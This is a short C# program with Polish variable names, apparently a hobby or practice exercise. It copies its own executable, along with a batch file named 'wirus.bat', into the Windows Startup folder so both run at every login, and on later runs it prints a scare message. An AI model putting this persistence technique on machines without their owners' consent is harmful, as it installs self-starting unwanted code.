using System;
using System.IO;
using System.Reflection;

namespace Autostart
{
    class Program
    {
        static void Main(string[] args)
        {
            var sciezkaAutostart = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            var nazwaProgramu = AppDomain.CurrentDomain.FriendlyName;
            var pelnaSciezka = Path.Combine(sciezkaAutostart, nazwaProgramu);

            var pelnaSciezkaBat = @"c:\Temp\wirus.bat";
            var pelnaSciezkaDocelowaBat = Path.Combine(sciezkaAutostart, "wirus.bat");

            var sciezkaPulpit = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

            if (!File.Exists(pelnaSciezka))
            {
                File.Copy(Assembly.GetExecutingAssembly().Location, pelnaSciezka );
            }
            else
            {
                Console.WriteLine("Bu");
                Console.ReadLine();
            }

            if (!File.Exists(pelnaSciezkaDocelowaBat))
            {
                File.Copy(pelnaSciezkaBat, pelnaSciezkaDocelowaBat);
            }
        }
    }
}
